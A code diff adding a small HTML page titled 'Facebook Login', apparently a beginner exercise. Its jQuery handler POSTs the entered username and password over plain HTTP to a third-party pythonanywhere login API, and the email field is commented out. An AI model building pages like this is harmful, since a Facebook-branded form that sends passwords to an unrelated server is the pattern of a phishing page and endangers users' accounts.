@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<style type="text/css">
+		a{
+	  	text-decoration: none;
+	  	  }
+	</style>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function(){
+			$('#fun').click(function(){
+				user = $('#username').val();
+				pass = $('#password').val();
+				$.ajax({
+					url:'http://baabtra.pythonanywhere.com/loginApi/',
+					type:'POST',
+					data:{"username":user,"password":pass},
+					success: function(response){
+						console.log(response);
+					
+					},
+					error: function(error){
+						console.log(error);
+					}
+				 });
+			});
+		});
+	</script>	
+</head>
+<body>
+	<h3 style="color: #003399">Facebook Login</h3>
+	<hr>
+	<table>
+	<!-- <tr>
+	<td>Email or phone:</td>
+	<td><input type="" name="" id="username"></td>
+	</tr> -->
+	<tr><td>
+	Password:</td>
+	<td><input type="Password" name="" id="password" ></td></tr>
+	<tr><td></td><td><input type="checkbox" name="">keep me logged in</td></tr>
+	<tr><td></td><td><input type="button" name="" value="Log In" id="fun" style="background-color: #5c5cd6"> or 
+		<a href="">sign up for facebook </a></td></tr>
+		<tr><td></td><td><a href="">Forgotten password?</td></tr>
+	</table>
+</body>
+</html>
